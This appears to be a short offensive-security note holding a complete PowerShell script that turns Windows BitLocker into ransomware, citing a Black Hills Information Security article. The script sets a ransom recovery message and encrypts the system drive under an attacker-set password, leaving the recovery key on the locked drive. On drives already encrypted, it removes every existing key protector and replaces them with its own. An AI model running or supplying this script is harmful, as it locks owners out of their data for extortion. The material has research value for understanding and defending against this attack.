# Bitlocker

## Scripting

### PowerShell

```powershell
$Message = "please Visit my hacker site https://yourscrewed.hahaha to give me money"

# Check if BitLocker is already enabled on the system drive
$Check = Get-BitLockerVolume -MountPoint $Env:SystemDrive
$Status = $Check.ProtectionStatus

if ($Status -eq 'Off') {
    echo 'BitLocker NOT Enabled on System Drive'
}

if ($Status -eq 'On') {
    echo 'BitLocker IS Enabled on System Drive'
}

# Set registry first
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name EnableBDEWithNoTPM -Type DWord -Value 1
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseAdvancedStartup -Type DWord -Value 1
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPM -Type DWord -Value 2
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPMKey -Type DWord -Value 2
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPMKeyPIN -Type DWord -Value 2

# Change the recovery message to meet your needs
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name RecoveryKeyMessage -Type String -Value $Message
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name RecoveryKeyMessageSource -Type DWord -Value 2
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPMPIN -Type DWord -Value 2

# Use a Strong Password Here!
$PlainPassword = "P@ssw0rd"
$SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force

if ($Status -eq 'Off') {
    # Enable BitLocker, Encrypt the used space on the C: drive
    Enable-BitLocker -EncryptionMethod Aes256 -Password $SecurePassword -MountPoint $Env:SystemDrive -PasswordProtector -SkipHardwareTest -UsedSpaceOnly

    # Create a recovery key (inaccessible)
    Add-BitLockerKeyProtector -MountPoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $Env:SystemDrive\

    # Uncomment to restart the Computer ASAP
    Restart-Computer
}

# If BitLocker is already enabled on the system drive
if ($Status -eq 'On') {
    # Strip all Passwords and Recovery keys
    $IDS = $Check.KeyProtector.KeyProtectorID

    foreach ($ID in $IDS) {
        Remove-BitLockerKeyProtector -MountPoint $Env:SystemDrive -KeyProtectorID $ID
    }

    # Add my own passwords and keys
    Add-BitLockerKeyProtector -MountPoint $Env:SystemDrive -PasswordProtector -Password $SecurePassword
    Add-BitLockerKeyProtector -MountPoint $Env:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $Env:SystemDrive\

    Resume-BitLocker -MountPoint $Env:SystemDrive
}

```

---
## References

### Black Hills Information Security

- [Black Hills Information Security: Bitlocker Ransomware: Using BitLocker for Nefarious Reasons](https://www.blackhillsinfosec.com/bitlocker-ransomware-using-bitlocker-for-nefarious-reasons/)